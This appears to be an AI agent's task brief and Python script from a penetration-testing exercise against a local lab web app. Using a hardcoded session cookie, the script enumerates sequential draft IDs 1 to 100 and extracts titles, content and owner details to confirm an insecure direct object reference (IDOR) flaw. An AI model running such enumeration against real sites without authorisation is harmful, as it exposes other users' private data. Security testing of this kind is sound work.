# Objective and context
Enumerate sequential draft IDs at /edit_draft/{id} to identify valid drafts.

Target: http://127.0.0.1:32994

Steps:
1. First, log in with existing credentials (if we have them from context: registration was completed previously but session expired). If you don't have credentials:
   - First register a new user at /register with username, password, confirm_password
   - Then log in at /login

2. Once authenticated, enumerate draft IDs by sending GET requests to /edit_draft/{id} for IDs 1 to 100

3. Track which IDs return valid draft pages (200 status) vs redirects/404s

4. For valid drafts, extract and report:
   - Draft ID
   - Draft title/content if visible
   - Any indication if it's another user's draft (IDOR evidence)

The context mentions "predictable sequential IDs for drafts (/edit_draft/1, /edit_draft/2, etc.)" as a confirmed IDOR vulnerability. We're looking for drafts that belong to other users or admin.

Return a summary of all valid draft IDs found and their content.

import requests
import re

# Target configuration
base_url = "http://127.0.0.1:32994"

# Use existing session cookie from context
session_cookie = ".eJwljjEOAyEMwP6SuUMCJJD7zImQoHblelPVvxepu235A-dccT3heK87HnC-HA5QZS6MIirVxDl5CvceOrHXwh6dJRWU4cQ5JlorHNxVA4dLHTIpqNqMQpx2Aet2BX1wIm6W6yBBbhRl88MtN50dMYdjCjGDPXJfsf43Bb4_rxAvbg.ac3a5Q.59h6xFSfxCcCVp60tE2Wt5CXqLc"

cookies = {
    'session': session_cookie
}

valid_drafts = []
not_found_count = 0
error_count = 0

print("[*] Starting draft ID enumeration from 1 to 100...")
print(f"[*] Using session cookie: {session_cookie[:30]}...")
print()

for draft_id in range(1, 101):
    url = f"{base_url}/edit_draft/{draft_id}"
    
    try:
        response = requests.get(url, cookies=cookies, allow_redirects=False, timeout=10)
        
        if response.status_code == 200:
            # Valid draft found
            print(f"[+] ID {draft_id}: VALID DRAFT FOUND (200)")
            print(f"    Length: {len(response.text)} bytes")
            
            # Extract title/content from HTML
            title_match = re.search(r'<title>(.*?)</title>', response.text, re.DOTALL)
            if title_match:
                print(f"    Title: {title_match.group(1).strip()}")
            
            # Look for draft content in form fields
            content_match = re.search(r'name=["\']content["\'][^>]*>(.*?)</textarea>', response.text, re.DOTALL)
            if content_match:
                content = content_match.group(1).strip()[:200]  # First 200 chars
                print(f"    Content preview: {content}")
            
            # Check for user info in the page
            user_match = re.search(r'(user|author|owner|created_by)["\']?\s*[:=]\s*["\']?([^"\'>\s]+)', response.text, re.I)
            if user_match:
                print(f"    User info: {user_match.group(2)}")
            
            # Check if it's marked as "other user's draft"
            if 'permission' in response.text.lower() or 'unauthorized' in response.text.lower():
                print(f"    [!] Access warning/permission message detected")
            
            valid_drafts.append({
                'id': draft_id,
                'status': 200,
                'length': len(response.text),
                'title': title_match.group(1).strip() if title_match else 'N/A',
                'content_preview': content[:100] if content_match else 'N/A'
            })
            print()
            
        elif response.status_code == 302 or response.status_code == 301:
            # Redirect - likely to login or dashboard (no permission)
            location = response.headers.get('Location', 'unknown')
            print(f"[-] ID {draft_id}: Redirect ({response.status_code}) -> {location}")
            
        elif response.status_code == 404:
            not_found_count += 1
            # Don't print all 404s to reduce noise
            if draft_id <= 5 or draft_id >= 95:
                print(f"[-] ID {draft_id}: Not Found (404)")
                
        elif response.status_code == 403:
            print(f"[!] ID {draft_id}: Forbidden (403) - Possible existing draft but access denied")
            
        else:
            print(f"[?] ID {draft_id}: Status {response.status_code}")
            error_count += 1
            
    except Exception as e:
        print(f"[!] ID {draft_id}: Error - {str(e)}")
        error_count += 1

# Summary
print("\n" + "="*60)
print("ENUMERATION SUMMARY")
print("="*60)
print(f"Total drafts tested: 100")
print(f"Valid drafts found (200): {len(valid_drafts)}")
print(f"Not found (404): {not_found_count}")
print(f"Errors/other: {error_count}")
print()

if valid_drafts:
    print("VALID DRAFT IDs:")
    print("-" * 40)
    for draft in valid_drafts:
        print(f"  ID {draft['id']}: {draft['title']} ({draft['length']} bytes)")
        
    print()
    print("IDOR Analysis:")
    print("-" * 40)
    if len(valid_drafts) > 1:
        print(f"[!] Found {len(valid_drafts)} accessible drafts")
        print("[!] If these drafts belong to different users, this confirms IDOR vulnerability")
    else:
        print("[!] Only 1 draft accessible - may be the user's own draft")
else:
    print("[!] No valid drafts found - session may be expired or no drafts exist")
